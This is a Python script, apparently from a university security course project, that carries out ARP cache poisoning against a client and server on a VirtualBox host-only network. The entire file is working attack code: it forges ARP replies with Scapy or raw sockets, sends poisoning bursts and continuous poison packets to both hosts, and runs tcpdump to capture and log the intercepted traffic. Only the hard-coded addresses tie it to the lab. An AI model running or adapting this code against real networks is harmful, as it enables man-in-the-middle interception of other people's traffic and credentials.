#!/usr/bin/env python3
"""
Enhanced ARP Cache Poisoning Attack for CSE406 Project
Modified for VirtualBox Host-Only Network
"""

import socket
import struct
import time
import threading
import subprocess
import sys
import os
from datetime import datetime

try:
    from scapy.all import ARP, send, get_if_hwaddr
    SCAPY_AVAILABLE = True
    print("[+] Scapy library detected - using enhanced mode")
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] Scapy not available - using raw socket mode")

class SimpleARPAttack:
    def __init__(self):
        self.client_ip = "192.168.56.200"  # Client
        self.client_mac = None
        self.server_ip = "192.168.56.250"  # Server
        self.server_mac = None
        self.attacker_ip = "192.168.56.150"  # Attacker
        self.attacker_mac = None
        self.poisoning = False

    def get_mac_address(self, ip):
        """Get MAC address for IP using arp command or Scapy."""
        if SCAPY_AVAILABLE:
            try:
                ans, _ = ARP(pdst=ip).srp(timeout=2, verbose=False)
                for _, received in ans:
                    return received.hwsrc.lower()
            except Exception as e:
                print(f"[-] Scapy MAC resolution failed for {ip}: {e}")
        try:
            result = subprocess.run(["arp", "-n", ip], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split("\n"):
                    if ip in line:
                        parts = line.split()
                        for part in parts:
                            if ":" in part and len(part) >= 17:
                                return part.lower()
        except Exception as e:
            print(f"[-] ARP command failed for {ip}: {e}")
        return None  # No default MAC to avoid invalid packets

    def get_interface_info(self):
        """Get local interface information."""
        interface = input("Enter network interface (e.g., enp0s3): ") or "enp0s3"
        try:
            if SCAPY_AVAILABLE:
                self.attacker_mac = get_if_hwaddr(interface).lower()
                print(f"[+] Attacker MAC (Scapy): {self.attacker_mac}")
                return interface
            with open(f"/sys/class/net/{interface}/address", "r") as f:
                self.attacker_mac = f.read().strip().lower()
                print(f"[+] Attacker MAC: {self.attacker_mac}")
                return interface
        except:
            try:
                result = subprocess.run(["ip", "link", "show", interface], capture_output=True, text=True)
                if result.returncode == 0:
                    for line in result.stdout.split("\n"):
                        if "link/ether" in line:
                            self.attacker_mac = line.split()[1].lower()
                            print(f"[+] Attacker MAC: {self.attacker_mac}")
                            return interface
            except:
                print("[-] Could not determine MAC address")
                self.attacker_mac = None
                return interface

    def create_arp_packet(self, target_mac, target_ip, sender_ip, sender_mac):
        """Create ARP poison packet."""
        try:
            if not sender_mac or not target_mac:
                raise ValueError("Invalid MAC addresses")
            eth_dst = bytes.fromhex(target_mac.replace(":", ""))
            eth_src = bytes.fromhex(sender_mac.replace(":", ""))
            eth_type = struct.pack("!H", 0x0806)
            eth_header = eth_dst + eth_src + eth_type
            hw_type = struct.pack("!H", 1)
            proto_type = struct.pack("!H", 0x0800)
            hw_len = struct.pack("!B", 6)
            proto_len = struct.pack("!B", 4)
            operation = struct.pack("!H", 2)
            sender_mac_bytes = bytes.fromhex(sender_mac.replace(":", ""))
            sender_ip_bytes = socket.inet_aton(sender_ip)
            target_mac_bytes = bytes.fromhex(target_mac.replace(":", ""))
            target_ip_bytes = socket.inet_aton(target_ip)
            arp_packet = (
                hw_type + proto_type + hw_len + proto_len + operation +
                sender_mac_bytes + sender_ip_bytes + target_mac_bytes + target_ip_bytes
            )
            return eth_header + arp_packet
        except Exception as e:
            print(f"[-] Error creating ARP packet: {e}")
            return None

    #The rapid burst minimizes the chance of legitimate ARP replies overriding the spoofed ones
    def rapid_poison_burst(self, count=10):
        """Send rapid burst of poison packets."""
        if not SCAPY_AVAILABLE:
            print("[-] Rapid burst requires Scapy library")
            return
        interface = "enp0s3"
        try:
            self.attacker_mac = get_if_hwaddr(interface)
            # mac of specified interface
            #used as the spoofed source MAC in ARP packets
            print(f"[+] Sending rapid poison burst ({count} packets)...")
            for i in range(count):#10 times to send a burst of packets
                arp_poison_client = ARP(
                    op=2, pdst=self.client_ip, hwdst=self.client_mac or "ff:ff:ff:ff:ff:ff",
                    psrc=self.server_ip, hwsrc=self.attacker_mac
                )
                arp_poison_server = ARP(
                    op=2, pdst=self.server_ip, hwdst=self.server_mac or "ff:ff:ff:ff:ff:ff",
                    psrc=self.client_ip, hwsrc=self.attacker_mac
                )
                send(arp_poison_client, iface=interface, verbose=0)
                send(arp_poison_server, iface=interface, verbose=0)
                print(f"[+] Rapid poison packet {i+1}/{count} sent")
                time.sleep(0.1)
            print("[+] Rapid poison burst completed!")
        except Exception as e:
            print(f"[-] Rapid burst error: {e}")

    def poison_arp_cache_scapy(self):
        """Enhanced ARP poisoning using Scapy."""
        if not SCAPY_AVAILABLE:
            print("[-] Scapy not available, falling back to raw socket method")
            return self.poison_arp_cache()
        interface = "enp0s3"
        try:
            self.attacker_mac = get_if_hwaddr(interface)
            self.client_mac = self.get_mac_address(self.client_ip)
            self.server_mac = self.get_mac_address(self.server_ip)
            print(f"[+] Attacker MAC: {self.attacker_mac}")
            print(f"[+] Client MAC: {self.client_mac or 'Not resolved'}")
            print(f"[+] Server MAC: {self.server_mac or 'Not resolved'}")
            print(f"[+] Starting enhanced ARP poisoning attack...")
            poison_count = 0
            while self.poisoning:
                arp_poison_client = ARP(
                    op=2, pdst=self.client_ip, hwdst=self.client_mac or "ff:ff:ff:ff:ff:ff",
                    psrc=self.server_ip, hwsrc=self.attacker_mac
                )
                arp_poison_server = ARP(
                    op=2, pdst=self.server_ip, hwdst=self.server_mac or "ff:ff:ff:ff:ff:ff",
                    psrc=self.client_ip, hwsrc=self.attacker_mac
                )
                send(arp_poison_client, iface=interface, verbose=0)
                send(arp_poison_server, iface=interface, verbose=0)
                poison_count += 1
                timestamp = datetime.now().strftime("%H:%M:%S")
                print(f"[{timestamp}] Scapy poison packet #{poison_count} sent")
                with open("/opt/tools/traffic_log.txt", "a") as f:
                    f.write(f"[{timestamp}] ARP poison: Client {self.client_ip}, Server {self.server_ip}\n")
                time.sleep(1)
        except Exception as e:
            print(f"[-] Scapy poisoning error: {e}")
            return self.poison_arp_cache()

    def poison_arp_cache(self):
        """Main ARP poisoning function."""
        interface = self.get_interface_info()
        if not self.attacker_mac:
            print("[-] Could not determine attacker MAC address")
            return
        self.client_mac = self.get_mac_address(self.client_ip)
        self.server_mac = self.get_mac_address(self.server_ip)
        print(f"[+] Client MAC: {self.client_mac or 'Not resolved'}")
        print(f"[+] Server MAC: {self.server_mac or 'Not resolved'}")
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
            sock.bind((interface, 0))
            poison_count = 0
            while self.poisoning:
                poison_packet_client = self.create_arp_packet(
                    self.client_mac or "ff:ff:ff:ff:ff:ff", self.client_ip, self.server_ip, self.attacker_mac
                )
                poison_packet_server = self.create_arp_packet(
                    self.server_mac or "ff:ff:ff:ff:ff:ff", self.server_ip, self.client_ip, self.attacker_mac
                )
                if poison_packet_client:
                    sock.send(poison_packet_client)
                if poison_packet_server:
                    sock.send(poison_packet_server)
                poison_count += 1
                timestamp = datetime.now().strftime("%H:%M:%S")
                print(f"[{timestamp}] Poison packet #{poison_count} sent")
                time.sleep(2)
        except Exception as e:
            print(f"[-] Poisoning error: {e}")
        finally:
            sock.close()

    def monitor_traffic(self):
        """Monitor network traffic."""
        print("[+] Starting traffic monitoring...")
        try:
            with open("/opt/tools/traffic_log.txt", "w") as f:
                timestamp = datetime.now().strftime("%H:%M:%S")
                f.write(f"[{timestamp}] Traffic monitoring started\n")
        except:
            os.makedirs("/opt/tools", exist_ok=True)
            with open("/opt/tools/traffic_log.txt", "w") as f:
                f.write(f"[{timestamp}] Traffic monitoring started\n")
        try:
            result = subprocess.run(["which", "tcpdump"], capture_output=True, text=True)
            if result.returncode != 0:
                print("[!] tcpdump not found, installing...")
                subprocess.run(["apt", "update"], capture_output=True)
                subprocess.run(["apt", "install", "-y", "tcpdump"], capture_output=True)
            cmd = ["tcpdump", "-i", "enp0s3", "-n", "-l", f"host {self.client_ip} or host {self.server_ip}"]
            process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, universal_newlines=True
            )
            while self.poisoning:
                line = process.stdout.readline()
                if line:
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    clean_line = line.strip()
                    if clean_line and not clean_line.startswith("tcpdump:"):
                        print(f"[{timestamp}] TRAFFIC: {clean_line}")
                        with open("/opt/tools/traffic_log.txt", "a") as f:
                            f.write(f"[{timestamp}] {clean_line}\n")
                else:
                    time.sleep(0.1)
            process.terminate()
            process.wait(timeout=5)
        except Exception as e:
            print(f"[-] Traffic monitoring error: {e}")

    def start_attack(self, duration=300):
        """Start the complete attack."""
        print("=" * 70)
        print("Enhanced ARP Cache Poisoning Attack - CSE406 Project")
        print(f"Mode: {'Scapy Enhanced' if SCAPY_AVAILABLE else 'Raw Socket'}")
        print("=" * 70)
        if os.geteuid() != 0:
            print("[-] This script requires root privileges")
            return
        self.poisoning = True
        monitor_thread = threading.Thread(target=self.monitor_traffic)
        monitor_thread.daemon = True
        monitor_thread.start()
        time.sleep(1)
        if SCAPY_AVAILABLE:
            print("[+] Sending initial rapid poison burst...")
            self.rapid_poison_burst(10)
            time.sleep(1)
            print("[+] Using enhanced Scapy-based ARP poisoning")
            poison_thread = threading.Thread(target=self.poison_arp_cache_scapy)
        else:
            print("[+] Using raw socket ARP poisoning")
            poison_thread = threading.Thread(target=self.poison_arp_cache)
        poison_thread.daemon = True
        poison_thread.start()
        try:
            print(f"[+] Attack running for {duration} seconds...")
            print("[+] Press Ctrl+C to stop early")
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\n[+] Attack stopped by user")
        self.poisoning = False
        print("[+] Cleaning up...")
        time.sleep(2)
        print("[+] Attack completed")

def main():
    if os.geteuid() != 0:
        print("[-] This script requires root privileges")
        print("[+] Run with: sudo python3 simple_arp_attack.py")
        sys.exit(1)
    attack = SimpleARPAttack()
    attack.start_attack()

if __name__ == "__main__":
    main()